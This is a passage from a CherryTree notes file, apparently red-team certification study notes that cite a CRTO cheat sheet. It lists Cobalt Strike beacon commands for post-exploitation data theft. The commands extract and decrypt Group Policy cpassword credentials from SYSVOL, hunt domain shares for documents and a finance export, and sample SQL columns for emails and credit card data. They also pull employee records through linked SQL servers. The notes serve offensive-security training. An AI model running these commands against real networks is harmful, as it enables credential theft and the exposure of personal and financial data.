beacon&gt; shell findstr /S /I cpassword \\dc.organicsecurity.local\sysvol\organicsecurity.local\policies\*.xml
beacon&gt; Get-DecryptedCpassword

</rich_text>
    <rich_text family="monospace" scale="h3" weight="heavy"># Find accessible share having juicy information</rich_text>
    <rich_text scale="h3" weight="heavy">
beacon&gt; powerpick Find-DomainShare -CheckShareAccess
beacon&gt; powerpick Find-InterestingDomainShareFile -Include *.doc*, *.xls*, *.csv, *.ppt*
beacon&gt; powerpick gc \\fs.dev.cyberbotic.io\finance$\export.csv | select -first 5

</rich_text>
    <rich_text family="monospace" scale="h3" weight="heavy"># Search for senstive data in directly accessible DB by keywords</rich_text>
    <rich_text scale="h3" weight="heavy">
beacon&gt; powerpick Get-SQLInstanceDomain | Get-SQLConnectionTest | ? { $_.Status -eq "Accessible" } | Get-SQLColumnSampleDataThreaded -Keywords "email,address,credit,card" -SampleSize 5 | select instance, database, column, sample | ft -autosize

</rich_text>
    <rich_text family="monospace" scale="h3" weight="heavy"># Search for senstive data in DB links</rich_text>
    <rich_text scale="h3" weight="heavy">
beacon&gt; powerpick Get-SQLQuery -Instance "sql-2.dev.cyberbotic.io,1433" -Query "select * from openquery(""sql-1.cyberbotic.io"", 'select * from information_schema.tables')"

beacon&gt; powerpick Get-SQLQuery -Instance "sql-2.dev.cyberbotic.io,1433" -Query "select * from openquery(""sql-1.cyberbotic.io"", 'select column_name from master.information_schema.columns where table_name=''employees''')"

beacon&gt; powerpick Get-SQLQuery -Instance "sql-2.dev.cyberbotic.io,1433" -Query "select * from openquery(""sql-1.cyberbotic.io"", 'select top 5 first_name,gender,sort_code from master.dbo.employees')"</rich_text>
  </node>
  <node name="Reference" unique_id="42" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="1" foreground="" ts_creation="1697293773" ts_lastsave="1697293794">
    <rich_text weight="heavy">
</rich_text>
    <rich_text scale="h3" weight="heavy">
</rich_text>
    <rich_text link="webs https://github.com/0xn1k5/Red-Teaming/blob/main/Red%20Team%20Certifications%20-%20Notes%20%26%20Cheat%20Sheets/CRTO%20-%20Notes%20%26%20Cheat%20Sheet.md" scale="h3" weight="heavy">https://github.com/0xn1k5/Red-Teaming/blob/main/Red%20Team%20Certifications%20-%20Notes%20%26%20Cheat%20Sheets/CRTO%20-%20Notes%20%26%20Cheat%20Sheet.md</rich_text>
    <rich_text>


</rich_text>
  </node>
</cherrytree>
